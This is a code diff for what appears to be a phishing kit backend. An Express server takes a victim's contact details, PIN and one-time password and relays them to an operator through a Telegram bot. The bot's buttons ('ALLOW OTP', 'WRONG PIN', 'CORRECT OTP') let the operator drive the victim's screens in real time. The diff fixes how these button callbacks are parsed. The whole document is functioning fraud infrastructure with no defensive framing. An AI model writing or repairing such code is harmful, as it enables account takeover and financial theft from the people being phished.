@@ -218,9 +218,10 @@ async function initBot() {
         return;
       }
 
-      const parts = actionData.split('_');
-      const prefix = parts.slice(0, 2).join('_'); 
-      const targetId = parts.slice(2).join('_');
+      // FIX: Use single underscores safely separating action prefix from the safe userId token
+      const underscoreIndex = actionData.indexOf('_');
+      const prefix = underscoreIndex !== -1 ? actionData.substring(0, underscoreIndex) : actionData;
+      const targetId = underscoreIndex !== -1 ? actionData.substring(underscoreIndex + 1) : '';
 
       let session = sessions.get(targetId);
       if (!session) {
@@ -230,23 +231,23 @@ async function initBot() {
       const chatTarget = session.adminChatId || chatId;
 
       switch (prefix) {
-        case 'ALLOW_OTP':
+        case 'ALLOWOTP':
           session.status = 'APPROVED_LOAD_OTP';
           await bot.sendMessage(chatTarget, `✅ OTP screen authorized for ${session.contact}`);
           break;
-        case 'DENY_OTP':
+        case 'DENYOTP':
           session.status = 'DENIED';
           await bot.sendMessage(chatTarget, `❌ Access denied for ${session.contact}`);
           break;
-        case 'CORRECT_OTP':
+        case 'CORRECTOTP':
           session.status = 'SUCCESS';
           await bot.sendMessage(chatTarget, `🎉 Success screen unlocked for ${session.contact}`);
           break;
-        case 'WRONG_PIN':
+        case 'WRONGPIN':
           session.status = 'RETRY_PIN';
           await bot.sendMessage(chatTarget, `⚠️ Invalid PIN prompt triggered.`);
           break;
-        case 'WRONG_OTP':
+        case 'WRONGOTP':
           session.status = 'RETRY_OTP';
           await bot.sendMessage(chatTarget, `⚠️ Invalid 6-digit OTP prompt triggered.`);
           break;
@@ -292,7 +293,8 @@ app.post('/api/submit-application', async (req, res) => {
       return res.status(400).json({ success: false, error: 'Target chat ID missing.' });
     }
 
-    const userId = cleanContact ? cleanContact.replace(/[^a-zA-Z0-9]/g, '_') : `user_${Date.now()}`;
+    // FIX: Generate a safe alphanumeric ID without inner underscores that break splitting
+    const userId = 'usr_' + Date.now() + Math.random().toString(36).substring(2, 7);
 
     sessions.set(userId, {
       contact: cleanContact,
@@ -312,8 +314,8 @@ app.post('/api/submit-application', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '✅ ALLOW OTP', callback_data: `ALLOW_OTP_${userId}` },
-            { text: '❌ DENY', callback_data: `DENY_OTP_${userId}` }
+            { text: '✅ ALLOW OTP', callback_data: `ALLOWOTP_${userId}` },
+            { text: '❌ DENY', callback_data: `DENYOTP_${userId}` }
           ]
         ]
       }
@@ -360,11 +362,11 @@ app.post('/api/submit-otp', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '⚠️ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
-            { text: '⚠️ WRONG OTP', callback_data: `WRONG_OTP_${userId}` }
+            { text: '⚠️ WRONG PIN', callback_data: `WRONGPIN_${userId}` },
+            { text: '⚠️ WRONG OTP', callback_data: `WRONGOTP_${userId}` }
           ],
           [
-            { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
+            { text: '✅ CORRECT OTP', callback_data: `CORRECTOTP_${userId}` }
           ]
         ]
       }
